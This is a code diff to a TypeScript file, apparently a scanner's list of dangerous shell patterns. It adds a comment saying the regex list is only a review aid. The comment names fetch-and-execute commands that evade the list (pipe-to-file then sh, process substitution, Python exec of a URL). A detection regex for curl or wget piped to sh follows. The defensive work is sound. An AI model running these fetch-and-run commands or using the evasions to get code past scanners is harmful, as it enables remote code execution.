@@ -26,7 +26,22 @@ export interface Flag {
   sample: string;
 }
 
-/** Fetch-and-execute, reverse shells, and quiet exfiltration. */
+/**
+ * Fetch-and-execute, reverse shells, and quiet exfiltration.
+ *
+ * READ THIS BEFORE RELYING ON IT. These patterns are a review aid, not a
+ * security boundary. Pattern matching on shell text is trivially evadable and
+ * always will be: `curl x | sh` is caught, `curl x > /tmp/a && sh /tmp/a`,
+ * `bash <(curl x)` and `python -c 'exec(urlopen(...).read())'` are not, and no
+ * finite list closes that. Measured on this list, five of eight hand-written
+ * evasions pass.
+ *
+ * What it is for: making a careless or accidental contribution obvious, and
+ * handing a reviewer a reason to look. What actually defends the corpus is
+ * that every finding arrives by pull request and a person merges it. If that
+ * review lapses, this list will not save anyone, and treating it as though it
+ * would is the more dangerous error.
+ */
 const DANGEROUS: Array<{ re: RegExp; pattern: string; reason: string; severity: 'block' | 'warn' }> = [
   {
     re: /\b(curl|wget|fetch)\b[^\n|]*\|\s*(ba)?sh\b/i,
